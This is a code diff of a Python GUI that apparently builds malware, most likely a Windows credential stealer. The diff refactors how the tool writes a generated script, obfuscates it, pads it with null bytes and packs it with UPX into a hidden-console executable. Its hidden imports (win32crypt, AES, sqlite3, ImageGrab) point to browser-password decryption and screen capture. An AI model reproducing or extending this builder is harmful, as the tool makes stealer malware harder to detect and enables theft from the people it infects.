@@ -13,15 +13,6 @@ import requests
 from PIL import Image
 
 
-def catcher(func):
-    def wrapper(*args, **kwargs):
-        try:
-            func(*args, **kwargs)
-        except Exception as error:
-            print(error)
-    return wrapper
-
-
 class App(customtkinter.CTk):
     def __init__(self):
         super().__init__()
@@ -413,8 +404,6 @@ class App(customtkinter.CTk):
             for _ in range(int(pump_size)):
                 f.write((b'\x00'))
 
-
-    @catcher
     def compile_file(self, filename):
         os.system("python ./tools/upx.py")
 
@@ -425,7 +414,6 @@ class App(customtkinter.CTk):
 
         os.system(
             f'''python -m PyInstaller --onefile --clean --noconsole --upx-dir=./tools --distpath ./ --hidden-import base64 --hidden-import ctypes --hidden-import json --hidden-import re --hidden-import time --hidden-import subprocess --hidden-import sys --hidden-import sqlite3 --hidden-import requests_toolbelt --hidden-import psutil --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import Crypto --hidden-import Crypto.Cipher.AES --hidden-import win32crypt --icon {exeicon} .\\{filename}.py''')
-
 
     def cleanup_files(self, filename):
         cleans_dir = {'./__pycache__', './build'}
@@ -446,18 +434,20 @@ class App(customtkinter.CTk):
                 pass
                 continue
 
-    @catcher
+    def write_and_obfuscate(self, filename):
+        with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
+            f.write(self.get_config())
+
+        if self.obfuscation.get() == 1:
+            os.system(f"python ./tools/obfuscation.py ./{filename}.py")
+            os.remove(f"./{filename}.py")
+            os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
+
     def buildfile(self):
         filename = self.return_filename()
 
         if self.get_filetype() == "py":
-            with open(f".\{filename}.py", 'w', encoding="utf-8") as f:
-                f.write(self.get_config())
-
-            if self.obfuscation.get() == 1:
-                os.system(f"python ./tools/obfuscation.py .\{filename}.py")
-                os.remove(f".\{filename}.py")
-                os.rename(f".\Obfuscated_{filename}.py", f".\{filename}.py")
+            self.write_and_obfuscate(filename)
 
             if self.pump.get() == 1:
                 self.file_pumper(filename, "py", self.get_mb())
@@ -466,13 +456,7 @@ class App(customtkinter.CTk):
             self.builder_frame.after(3000, self.reset_build_button)
 
         elif self.get_filetype() == "exe":
-            with open(f".\{filename}.py", 'w', encoding="utf-8") as f:
-                f.write(self.get_config())
-
-            if self.obfuscation.get() == 1:
-                os.system(f"python ./tools/obfuscation.py .\{filename}.py")
-                os.remove(f".\{filename}.py")
-                os.rename(f".\Obfuscated_{filename}.py", f".\{filename}.py")
+            self.write_and_obfuscate(filename)
 
             thread = threading.Thread(target=self.compile_file, args=(filename,))
             thread.start()
